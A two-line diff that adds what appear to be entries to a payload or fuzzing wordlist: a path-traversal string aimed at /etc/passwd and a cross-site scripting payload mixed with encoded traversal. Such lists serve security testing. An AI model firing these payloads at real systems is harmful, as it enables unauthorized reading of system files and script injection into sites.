@@ -1,0 +1,2 @@
+/login/../../../etc/passwd
+/<style%20onload=alert`document.domain`;>../..%2f
